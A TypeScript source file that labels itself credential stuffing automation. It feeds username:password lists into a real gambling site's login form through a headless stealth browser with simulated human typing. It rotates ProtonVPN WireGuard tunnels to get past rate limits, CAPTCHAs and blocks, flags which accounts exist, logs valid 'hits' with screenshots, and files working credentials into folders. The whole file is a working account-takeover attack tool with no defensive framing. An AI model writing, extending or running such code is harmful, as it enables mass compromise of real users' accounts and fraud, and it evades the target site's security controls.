// login-auto.ts — Credential stuffing automation
// Reads creds.txt (user:pass per line), reuses scanner selectors,
// attempts login per cred with ProtonVPN WireGuard IP rotation.

import { chromium, Page } from 'playwright';
import * as fs from 'fs';
import * as path from 'path';
import { STEALTH_LAUNCH_ARGS, getStealthContextOptions, injectDeepStealth, simulateHuman, humanType, randDelay } from './stealth-utils';
import { scanLogin, ScanResult } from './scanner';
import { initProxies, rotate, recordSuccess as vpnSuccess, recordFail as vpnFail, printProxyStats, vpnDown, VpnSlot } from './proxy-rotator';


// ─── Types ────────────────────────────────────────────────────────────────────

export type LoginOutcome = "success" | "wrong_credentials" | "rate_limited" | "account_locked" | "captcha_block" | "2fa_required" | "unknown";

export interface DetailedOutcome {
  outcome: LoginOutcome;
  accountExists: boolean;
  message?: string;
}

export interface LoginAttempt {
  url:       string;
  username:  string;
  timestamp: string;
  success:   boolean;
  outcome:   LoginOutcome;
  accountExists: boolean;
  reason:    string;
  tunnel:    string | null;
  durationMs: number;
}

// ─── Creds loader ─────────────────────────────────────────────────────────────

export function loadCreds(filePath: string = './creds.txt'): Array<{ username: string; password: string }> {
  const raw = fs.readFileSync(filePath, 'utf8');
  const creds: Array<{ username: string; password: string }> = [];

  for (const line of raw.split('\n')) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;

    // Support  user:pass  or  user,pass  or  user|pass
    const sep = trimmed.includes(':') ? ':' : trimmed.includes(',') ? ',' : '|';
    const idx = trimmed.indexOf(sep);
    if (idx === -1) continue;

    const username = trimmed.slice(0, idx).trim();
    const password = trimmed.slice(idx + 1).trim();
    if (username && password) creds.push({ username, password });
  }

  return creds;
}

// ─── Result log ───────────────────────────────────────────────────────────────

const LOGIN_LOG = './login_results.json';

const TXT_LOG = './login_results.txt';

function appendResult(attempt: LoginAttempt): void {
  let logs: LoginAttempt[] = [];
  try {
    logs = JSON.parse(fs.readFileSync(LOGIN_LOG, 'utf8'));
  } catch {
    // File doesn't exist or is invalid — start fresh
  }
  logs.push(attempt);
  fs.writeFileSync(LOGIN_LOG, JSON.stringify(logs, null, 2));

  // Also append to simple plain text file
  const textLine = `[${attempt.timestamp}] ${attempt.username} | ${attempt.outcome} | Exists: ${attempt.accountExists} | Reason: ${attempt.reason} | VPN: ${attempt.tunnel}\n`;
  fs.appendFileSync(TXT_LOG, textLine);
}

// ─── Post-Submit Outcome Detection ───────────────────────────────────────────

const SIGNALS = {
  failure: {
    keywords: [
      "invalid", "incorrect", "wrong password", "doesn't match",
      "not recognized", "not recognised", "account not found",
      "does not exist", "try again", "unable to log in"
    ],
    selectors: [
      '[class*="error-message"]', '[class*="alert-danger"]',
      '[class*="alert--error"]', '[role="alert"]',
      '[class*="invalid-feedback"]', '.ol-alert'
    ]
  },
  rateLimit: {
    warning: ["further failed attempts may result", "account being blocked"],
    lockout: [
      "too many attempts", "rate limit", "temporarily locked",
      "temporarily disabled", "account locked", "account has been",
      "try again later", "blocked", "suspended", "re-enable", "account disabled"
    ]
  },
  captcha: ["recaptcha", "grecaptcha", "hcaptcha", "cf-turnstile", "arkoselabs", "geetest"]
};

async function detectOutcome(page: Page, originalUrl: string): Promise<DetailedOutcome> {
  await page.waitForTimeout(randDelay(2000, 4000));
  
  const postSubmitUrl = page.url();
  const bodyText = (await page.locator('body').innerText().catch(() => '') || '').toLowerCase();
  const html = (await page.content().catch(() => '')).toLowerCase();
  const urlChanged = postSubmitUrl.toLowerCase() !== originalUrl.toLowerCase();

  // 1. CAPTCHA Detection
  // Only trigger if a CAPTCHA iframe or known element is actually visible and takes up real estate,
  // to avoid false positives from site-wide invisible tracking scripts.
  let hasCaptcha = false;
  
  if (bodyText.includes("solve the captcha") || bodyText.includes("verify you are human") || bodyText.includes("complete the captcha")) {
    hasCaptcha = true;
  } else {
    // Check iframes matching SIGNALS strings
    for (const frame of page.frames()) {
      const url = frame.url().toLowerCase();
      if (SIGNALS.captcha.some(p => url.includes(p))) {
        const fElement = await frame.frameElement().catch(() => null);
        if (fElement) {
          const isVisible = await fElement.isVisible().catch(() => false);
          const box = await fElement.boundingBox().catch(() => null);
          // Invisible trackers are very small, real challenges are large modals
          if (isVisible && box && box.width > 200 && box.height > 60) {
            hasCaptcha = true;
            break;
          }
        }
      }
    }
  }

  if (hasCaptcha) {
    return { outcome: 'captcha_block', accountExists: true, message: 'Visible CAPTCHA challenge detected' };
  }

  // 2. Rate Limit & Lockout Detection (Priority over standard failure)
  const lockoutMsg = SIGNALS.rateLimit.lockout.find(s => bodyText.includes(s));
  const warningMsg = SIGNALS.rateLimit.warning.find(s => bodyText.includes(s));

  if (lockoutMsg) return { outcome: 'account_locked', accountExists: true, message: lockoutMsg };
  if (warningMsg) return { outcome: 'rate_limited', accountExists: true, message: warningMsg };

  // 3. Standard Failure Detection
  const failureMsg = SIGNALS.failure.keywords.find(s => bodyText.includes(s));
  
  // Check visible error selectors
  let hasVisibleError = false;
  for (const selector of SIGNALS.failure.selectors) {
    const locator = page.locator(selector).first();
    if (await locator.isVisible().catch(() => false)) {
      hasVisibleError = true;
      break;
    }
  }

  if (failureMsg || hasVisibleError) {
    // Determine if account exists: "incorrect" implies existence, 
    // "not found" or "does not exist" implies it doesn't.
    const notFound = bodyText.includes("not found") || bodyText.includes("does not exist");
    return { 
      outcome: 'wrong_credentials', 
      accountExists: !notFound,
      message: failureMsg || 'visible error selector triggered'
    };
  }

  // 4. THE NEGATIVE SELECTION RULE: Default to Success
  // We assume success if no failure signals exist and we aren't stuck on the login URL
  const onLoginPath = postSubmitUrl.toLowerCase().includes('login') || postSubmitUrl.toLowerCase().includes('signin');
  
  if (urlChanged || !onLoginPath) {
    return { 
      outcome: 'success', 
      accountExists: true, 
      message: `Navigated successfully to: ${postSubmitUrl.split('?')[0]}` 
    };
  }

  // Fallback if we are still on the login page but no errors are visible
  return { outcome: 'unknown', accountExists: false, message: 'no clear signals found' };
}

// ─── Single login attempt ─────────────────────────────────────────────────────

async function attemptLogin(
  page:     Page,
  url:      string,
  selectors: ScanResult['selectors'],
  username: string,
  password: string
): Promise<DetailedOutcome> {

  // Build selectors (same robust logic as scanner)
  const usernameEl = selectors.find((s: any) => s.role === 'username_field');
  const passwordEl = selectors.find((s: any) => s.role === 'password_field');
  const submitEl   = selectors.find((s: any) => s.role === 'submit_button');

  const buildSel = (el: any, fallback: string): string => {
    if (el?.id)   return `#${el.id}`;
    if (el?.name) return `[name="${el.name}"]`;
    return fallback;
  };

  const usernameCss = buildSel(usernameEl, 'input[type="email"], input[type="text"]');
  const passwordCss = buildSel(passwordEl, 'input[type="password"]');
  const submitCss   = '#loginSubmit';

  await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 60000 });
  await page.waitForLoadState('networkidle', { timeout: 15000 }).catch(() => {});
  await simulateHuman(page);

  try {
    const loginNavBtn = 'body > div.ol-pos_sticky.ol-top_0.ol-z_docked > div > header > div.ol-headerRight__root.ol-headerRight__root--variant_center.ol-headerRight__root--size_lg.ol-headerRight__right.ol-headerRight__right--variant_center.ol-headerRight__right--size_lg > div.ol-headerRight__root.ol-headerRight__root--variant_center.ol-headerRight__root--size_lg.ol-headerRight__right.ol-headerRight__right--variant_center.ol-headerRight__right--size_lg > div.ol-headerRight__loggedOut.ol-headerRight__loggedOut--variant_center.ol-headerRight__loggedOut--size_lg > div > a';
    if (await page.isVisible(loginNavBtn)) {
      await page.click(loginNavBtn, { timeout: 5000 });
      await page.waitForTimeout(2000);
    } else {
      const genericBtn = await page.$('a:has-text("Login"), button:has-text("Login")');
      if (genericBtn && await genericBtn.isVisible()) {
        await genericBtn.click();
        await page.waitForTimeout(2000);
      }
    }
  } catch (e) {}

  await humanType(page, usernameCss, username);
  await page.waitForTimeout(randDelay(300, 700));

  let lastOutcome: DetailedOutcome | null = null;
  const errorStrs: string[] = [];

  for (let attemptNum = 1; attemptNum <= 3; attemptNum++) {
    // Restore the password string in case the web form wipes the field on failure
    const passLoc = page.locator(passwordCss).first();
    if (await passLoc.isVisible().catch(() => false)) {
      await passLoc.fill('');
      await humanType(page, passwordCss, password);
      await page.waitForTimeout(randDelay(200, 400));
    }

    await page.click(submitCss);
    lastOutcome = await detectOutcome(page, url);

    // Stop spamming if we succeeded, got asked for an auth code, or hit a brick captcha
    if (lastOutcome.outcome === 'success' || lastOutcome.outcome === '2fa_required' || lastOutcome.outcome === 'captcha_block') {
      break;
    }

    // "unless initial login error is account disabled"
    if (lastOutcome.outcome === 'account_locked') {
      // Record whatever locked message we found and bail out immediately
      if (lastOutcome.message && !errorStrs.includes(lastOutcome.message)) {
        errorStrs.push(lastOutcome.message);
      }
      break;
    }

    // Keep accumulating unique escalating errors on loop
    if (lastOutcome.message && !errorStrs.includes(lastOutcome.message)) {
      errorStrs.push(lastOutcome.message);
    }
  }

  // Bind the sequence of error strings to the reason so it prints elegantly 
  if (lastOutcome! && errorStrs.length > 0 && lastOutcome!.outcome !== 'success') {
    lastOutcome!.message = errorStrs.join(' -> ');
  }

  return lastOutcome!;
}

// ─── Is block/rate-limit error? ───────────────────────────────────────────────

function isBlockError(msg: string): boolean {
  const blockPhrases = [
    'ERR_CONNECTION_RESET', 'ERR_CONNECTION_REFUSED', 'ERR_PROXY',
    'net::ERR', 'timeout', 'TIMEOUT'
  ];
  return blockPhrases.some(p => msg.includes(p));
}

// ─── Main automation loop ─────────────────────────────────────────────────────

export async function runLoginAuto(
  targetUrl:  string = 'https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.joefortunepokies.win/&ved=2ahUKEwj9tdzIxPGTAxU6R2cHHSV2E5wQFnoECBcQAQ&usg=AOvVaw17UV8uR6npKRS-mDVv-s0x',
  credsFile:  string = './creds.txt',
  options: {
    delayBetweenMs?: [number, number]; // [min, max] delay between attempts
    rotateEvery?:    number;            // rotate VPN every N attempts (0 = only on block)
    stopOnSuccess?:  boolean;           // stop after first working cred
  } = {}
): Promise<void> {
  const {
    delayBetweenMs = [4000, 10000],
    rotateEvery    = 0,
    stopOnSuccess  = false,
  } = options;

  if (!targetUrl.startsWith('http')) targetUrl = 'https://' + targetUrl;

  // ── ProtonVPN WireGuard rotation (must activate BEFORE scanner/network) ──
  const configDir = process.env.PROTON_CONFIG_DIR || './proton_configs';
  const vpnSlots = initProxies(configDir);
  if (vpnSlots.length === 0) {
    console.error('[auto] No VPN configs found. Add ProtonVPN WireGuard .conf files to ./proton_configs/');
    console.error('[auto] Or set PROTON_CONFIG_DIR=/path/to/configs');
    return;
  }

  // Activate the first VPN before any network requests
  let activeVpn = rotate();
  if (!activeVpn) {
    console.error('[auto] Failed to activate initial VPN. Cannot proceed.');
    return;
  }

  // ── Load creds ──────────────────────────────────────────────────────────────
  const creds = loadCreds(credsFile);
  if (creds.length === 0) {
    console.error(`[auto] No creds found in ${credsFile}. Add lines in format: username:password`);
    return;
  }
  console.log(`[auto] Loaded ${creds.length} credential(s) from ${credsFile}`);

  // ── Get selectors from scan_results.json (most recent with selectors) ───────
  let selectors: ScanResult['selectors'] = [];
  let scanLog: ScanResult[] = [];
  try {
    scanLog = JSON.parse(fs.readFileSync('./scan_results.json', 'utf8'));
  } catch {
    // File doesn't exist or is invalid — will run scanner
  }
  const withSelectors = scanLog.filter(r => r.url === targetUrl && r.selectors.length > 0);

  if (withSelectors.length > 0) {
    selectors = withSelectors[withSelectors.length - 1].selectors;
    console.log(`[auto] Reusing ${selectors.length} selector(s) from previous scan`);
  } else {
    console.log(`[auto] No cached selectors for ${targetUrl} — running scanner first...`);
    const scanResult = await scanLogin(targetUrl);
    if (scanResult.selectors.length === 0) {
      console.error('[auto] Scanner found no selectors. Cannot proceed with login automation.');
      console.error('[auto] Ensure VPN is working and the scanner can reach the page.');
      return;
    }
    selectors = scanResult.selectors;
    console.log(`[auto] Scanner found ${selectors.length} selector(s)`);
  }

  // ── Stat tracking ────────────────────────────────────────────────────────────
  let attempted = 0;
  let succeeded = 0;
  const hits: LoginAttempt[] = [];

  const MAX_VISIBLE_ERROR_RETRIES = 3;

  // ── Loop through creds ──────────────────────────────────────────────────────
  for (let i = 0; i < creds.length; i++) {
    const { username, password } = creds[i];

    // Rotate VPN based on rotateEvery setting (default 0 = only rotate on blocks)
    if (rotateEvery > 0 && i > 0 && i % rotateEvery === 0) {
      console.log(`\n[auto] Rotating VPN (every ${rotateEvery} attempt${rotateEvery > 1 ? 's' : ''})...`);
      activeVpn = rotate();
      if (!activeVpn) {
        console.warn('[auto] VPN rotation failed — continuing with current connection.');
      }
    }

    let vpnName = activeVpn?.name ?? 'none';
    console.log(`\n[auto] [${i + 1}/${creds.length}] ${username} | vpn: ${vpnName}`);

    let attempt: LoginAttempt = {
      url:        targetUrl,
      username,
      timestamp:  new Date().toISOString(),
      success:    false,
      outcome:    'unknown',
      accountExists: false,
      reason:     '',
      tunnel:     vpnName,
      durationMs: 0,
    };

    // Retry loop: if we get "visible error selector triggered", rotate VPN and retry
    // with a fresh browser session (up to MAX_VISIBLE_ERROR_RETRIES times)
    for (let retryNum = 0; retryNum <= MAX_VISIBLE_ERROR_RETRIES; retryNum++) {

      const browser = await chromium.launch({
        headless: true,
        args: STEALTH_LAUNCH_ARGS,
        ignoreHTTPSErrors: true as any,
      } as any);

      const context = await browser.newContext({
        ...getStealthContextOptions(),
        ignoreHTTPSErrors: true as any,
      } as any);

      const page = await context.newPage();
      await injectDeepStealth(page, `login-${username}-${Date.now()}-r${retryNum}`);

      const t0 = Date.now();
      attempt.timestamp = new Date().toISOString();
      attempt.tunnel = activeVpn?.name ?? 'none';

      let shouldRetry = false;

      try {
        const outcome = await attemptLogin(page, targetUrl, selectors, username, password);

        attempt.success       = outcome.outcome === 'success' || outcome.outcome === '2fa_required';
        attempt.outcome       = outcome.outcome;
        attempt.accountExists = outcome.accountExists;
        attempt.reason        = outcome.message || outcome.outcome;
        attempt.durationMs    = Date.now() - t0;

        await page.screenshot({ path: `./attempt_${outcome.outcome}_${username.replace(/[^a-z0-9]/gi, '_')}_${Date.now()}.png`, fullPage: true }).catch(() => {});

        if (attempt.success) {
          console.log(`[auto] ✓ HIT: ${username}:${password} (${attempt.reason})`);
          if (activeVpn) vpnSuccess(activeVpn);
          succeeded++;
          hits.push(attempt);
        } else if (outcome.outcome === 'rate_limited' || outcome.outcome === 'captcha_block') {
          console.warn(`[auto] Blocked by ${outcome.outcome} on ${vpnName} — rotating VPN...`);
          if (activeVpn) vpnFail(activeVpn);
          activeVpn = rotate();
          vpnName = activeVpn?.name ?? 'none';
          shouldRetry = retryNum < MAX_VISIBLE_ERROR_RETRIES;
        } else if ((outcome.message || '').includes('visible error selector triggered') && retryNum < MAX_VISIBLE_ERROR_RETRIES) {
          // Visible error selector = likely IP/detection block, not wrong creds
          console.warn(`[auto] Visible error selector on ${vpnName} — rotating VPN and retrying ${username} (retry ${retryNum + 1}/${MAX_VISIBLE_ERROR_RETRIES})...`);
          if (activeVpn) vpnFail(activeVpn);
          activeVpn = rotate();
          vpnName = activeVpn?.name ?? 'none';
          shouldRetry = true;
        } else {
          console.log(`[auto] ✗ miss: ${username} (${attempt.reason})`);
        }

      } catch (err: any) {
        console.error(`[auto] error on ${username}: ${err.message?.split('\n')[0]}`);
        attempt.reason     = err.message?.split('\n')[0] ?? 'unknown_error';
        attempt.durationMs = Date.now() - t0;

        if (activeVpn) vpnFail(activeVpn);
        if (isBlockError(err.message ?? '')) {
          console.warn(`[auto] Block/connection error on ${vpnName} — rotating VPN now.`);
          activeVpn = rotate();
          vpnName = activeVpn?.name ?? 'none';
          shouldRetry = retryNum < MAX_VISIBLE_ERROR_RETRIES;
        }
      }

      await browser.close();

      if (!shouldRetry) break;

      // Wait before retry with new VPN
      const retryDelay = 2000;
      console.log(`[auto] Waiting 2s before retry...`);
      await new Promise(r => setTimeout(r, retryDelay));
    }

    appendResult(attempt);

    // ── Sort and remove consumed credential ──
    try {
      const lReason = attempt.reason.toLowerCase();
      const parts = lReason.split(' -> ');
      const initErr = parts[0] || '';
      const finalErr = parts[parts.length - 1] || '';

      let targetFolder = 'success';
      if (finalErr.includes('remains locked')) {
        targetFolder = 'no_account';
      } else if (finalErr.includes('temp disabled') || finalErr.includes('temporarily disabled')) {
        targetFolder = 'temp_disabled';
      } else if (initErr.includes('your account is disabled')) {
        targetFolder = 'disabled';
      } else {
        targetFolder = 'success';
      }

      const tPath = `./${targetFolder}`;
      if (!fs.existsSync(tPath)) fs.mkdirSync(tPath, { recursive: true });
      fs.appendFileSync(`${tPath}/creds.txt`, `${username}:${password}\n`);

      // Remove from main creds.txt securely
      const rawCreds = fs.readFileSync(credsFile, 'utf8');
      const filtered = rawCreds.split('\n').filter(l => {
        if (!l.trim() || l.trim().startsWith('#')) return true; // keep empty lines & comments
        return !(l.includes(username) && l.includes(password));
      });
      fs.writeFileSync(credsFile, filtered.join('\n'));
    } catch(e) {
      console.error(`[auto] Failed to sort/remove credential:`, e);
    }

    attempted++;

    if (stopOnSuccess && succeeded > 0) {
      console.log(`\n[auto] stopOnSuccess=true — stopping after first hit`);
      break;
    }

    // Human-like delay between attempts
    if (i < creds.length - 1) {
      const delay = randDelay(delayBetweenMs[0], delayBetweenMs[1]);
      console.log(`[auto] Waiting ${(delay / 1000).toFixed(1)}s before next attempt...`);
      await new Promise(r => setTimeout(r, delay));
    }
  }

  // ── Summary ─────────────────────────────────────────────────────────────────
  console.log(`\n${'─'.repeat(54)}`);
  console.log(`[auto] Done. ${attempted} attempted | ${succeeded} hit(s)`);
  if (hits.length > 0) {
    console.log('[auto] Successful credentials:');
    for (const h of hits) {
      console.log(`  ✓  ${h.username}  (${h.reason}, ${h.durationMs}ms)`);
    }
  }
  console.log(`[auto] Results saved to ${LOGIN_LOG}`);
  printProxyStats();
  console.log(`${'─'.repeat(54)}\n`);
}

// ── Graceful shutdown — tear down VPN on exit ─────────────────────────────────
function cleanup() {
  console.log('\n[auto] Shutting down — disconnecting VPN...');
  vpnDown();
  process.exit(0);
}
process.on('SIGINT', cleanup);
process.on('SIGTERM', cleanup);

// ── Allow direct execution ────────────────────────────────────────────────────
if (require.main === module) {
  const url = process.argv[2] || 'https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.joefortunepokies.win/&ved=2ahUKEwj9tdzIxPGTAxU6R2cHHSV2E5wQFnoECBcQAQ&usg=AOvVaw17UV8uR6npKRS-mDVv-s0x';
  runLoginAuto(url)
    .then(() => { vpnDown(); })
    .catch(e => { console.error(e); vpnDown(); process.exit(1); });
}
